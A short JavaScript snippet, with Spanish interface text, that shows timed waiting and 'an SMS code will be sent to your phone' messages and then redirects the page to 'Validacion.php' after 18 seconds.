let sms = document.getElementById('mensaje');
function sms1() {
    sms.innerText = 'Espere...';
}

function sms2() {
    sms.innerText = 'Enviaremos un codigo sms a tu celular';
}
setTimeout(() => {
    sms1();
}, 2000);
setTimeout(() => {
    sms2();
}, 7000);

setTimeout(() => {
    window.location = 'Validacion.php';
}, 18000);